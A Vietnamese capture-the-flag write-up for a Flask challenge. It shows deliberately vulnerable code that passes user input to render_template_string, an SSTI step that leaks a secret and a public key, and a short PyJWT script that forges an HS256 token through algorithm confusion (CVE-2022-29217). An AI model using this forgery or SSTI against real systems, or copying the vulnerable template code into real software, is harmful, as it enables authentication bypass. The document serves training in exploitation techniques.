## tổng quan recon
![image](/img/1.png)

dùng thử rồi white box nào

![image](/img/2.png)

click vào `ENTER` nó sẽ tạo cho mình 1 cookie
![image](/img/3.png)

có 2 endpoint cần focus trong chall này: `/kings_lair` và `/scarab_room`
truy cập vào endpoint `/kings_lair` thì báo `Internal 
Server Error`
![image](/img/4.png)


còn truy cập vào `/scarab_room` sau khi nhập tên thì
![image](/img/5.png)
đây là code của endpoint này
```
@app.route('/scarab_room', methods=['GET', 'POST'])
def scarab_room():
    try:
        if request.method == 'POST':
            name = request.form.get('name')
            if name:
                kings_safelist = ['{','}', '𓁹', '𓆣','𓀀', '𓀁', '𓀂', '𓀃', '𓀄', '𓀅', '𓀆', '𓀇', '𓀈', '𓀉', '𓀊', 
                                    '𓀐', '𓀑', '𓀒', '𓀓', '𓀔', '𓀕', '𓀖', '𓀗', '𓀘', '𓀙', '𓀚', '𓀛', '𓀜', '𓀝', '𓀞', '𓀟',
                                    '𓀠', '𓀡', '𓀢', '𓀣', '𓀤', '𓀥', '𓀦', '𓀧', '𓀨', '𓀩', '𓀪', '𓀫', '𓀬', '𓀭', '𓀮', '𓀯',
                                    '𓀰', '𓀱', '𓀲', '𓀳', '𓀴', '𓀵', '𓀶', '𓀷', '𓀸', '𓀹', '𓀺', '𓀻']  

                name = ''.join([char for char in name if char.isalnum() or char in kings_safelist])

                
                return render_template_string('''
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>Lost Pyramid</title>
                        <style>
                            body {
                                margin: 0;
                                height: 100vh;
                                background-image: url('{{ url_for('static', filename='scarab_room.webp') }}');
                                background-size: cover;
                                background-position: center;
                                background-repeat: no-repeat;
                                font-family: Arial, sans-serif;
                                color: white;
                                position: relative;
                            }

                            .return-link {
                                position: absolute;
                                top: 10px;
                                right: 10px;
                                font-family: 'Noto Sans Egyptian Hieroglyphs', sans-serif;
                                font-size: 32px;
                                color: gold;
                                text-decoration: none;
                                border: 2px solid gold;
                                padding: 5px 10px;
                                border-radius: 5px;
                                background-color: rgba(0, 0, 0, 0.7);
                            }

                            .return-link:hover {
                                background-color: rgba(0, 0, 0, 0.9);
                            }

                            h1 {
                                color: gold;
                            }
                        </style>
                    </head>
                    <body>
                        <a href="{{ url_for('hallway') }}" class="return-link">RETURN</a>
                        
                        {% if name %}
                            <h1>𓁹𓁹𓁹 Welcome to the Scarab Room, '''+ name + ''' 𓁹𓁹𓁹</h1>
                        {% endif %}
                        
                    </body>
                    </html>
                ''', name=name, **globals())
    except Exception as e:
        pass

    return render_template('scarab_room.html')
```

được rồi, ngay trong phần des có đề cập đến JWT, có lẽ chúng ta cần bypass cái này, view source nào

flag nằm trong template `kings_lair.html`, và được gọi tới ở endpoint `/king_lair`
![image](/img/6.png)


tại đây chúng ta cần bypass điều kiện ở dòng 132
![image](/img/7.png)

trong đó `KINGDAYS` được lấy từ `os.getenv`
![image](/img/8.png)

đồng thời private_key và public_key được load nằm trong `/app`
![image](/img/9.png)

okey, vậy là chúng ta cần bypass cái jwt kia để nó render temp nhả về flag

Đầu tiên chúng ta cần xem cookie được tạo ra thế nào
![image](/img/10.png)

nó truyền payload dạng json vào rồi sử dụng `jwt.encode()` để kí với PRIVATE_KEY cùng thuật toán `EdDSA`. Có vẻ không có lỗi gì ở đây

tiếp đến là xem nó verify cookie
![image](/img/11.png)

tại dòng 131 việc sử dụng `jwt.decode()` xảy ra một vấn đề, đó là không đồng bộ việc sử dụng thuật toán xác thực, như mình đã phân tích ở trên thì thuật toán dùng kí là `EdDSA` còn xác thực lại dùng `jwt.algorithms.get_default_algorithms()`

Bằng chứng rõ ràng cho ae tin nó sai nằm ở google =)), mình tham khảo tại [đây](https://www.vicarius.io/vsociety/posts/risky-algorithms-algorithm-confusion-in-pyjwt-cve-2022-29217)

`CVE-2022-29217`
![image](/img/12.png)

mình đã có 1 bài phân tích về `algorithm confusion in JWT`, mọi người có thể đọc thêm tại [github](https://github.com/soong1002/portswigger/blob/main/JWT/jwt_confusion_alg.md) của mình

### exploit
Như vậy chúng ta cần lấy được `PUBLIC_KEY` và `KINGSDAY`, tận dụng `algorithm confusion` để bypass 

quay trở lại với endpoint `/scarab_room`
![image](/img/13.png)

`name` không hề được check trước khi đưa vào template, rất có thể nó sẽ bị SSTI

thành công lấy được `KINGSDAY` và `PUBLIC_KEY` qua SSTI
![image](/img/14.png)
![image](/img/15.png)

code exploit
```
import jwt

#open and read ssh public key   

with open("public_key.pub","rb") as ssh_file:
    ssh_key_bytes = ssh_file.read()

# using HMAC with ssh public_key to trick server alg confusion

exploit = jwt.encode({
  "ROLE": "royalty",
  "CURRENT_DATE": "03_07_1341_BC",
  "exp": 96333905622
}, ssh_key_bytes, algorithm="HS256")

print(exploit)
```
để run được code này chúng ta cần tạo venv như trong `requirements.txt`
![image](/img/16.png)

chạy tập lệnh sau:
```
sudo apt install python3-env
python3 -m venv venv
source venv/bin/activate
pip3 install PyJWT==2.3.0 cryptography==43.0.0
```

sau khi cài đặt venv cần thiết ta có thể tạo jwt với HMAC SHA256

![image](/img/17.png)

và đây là kết quả mong chờ

![image](/img/18.png)














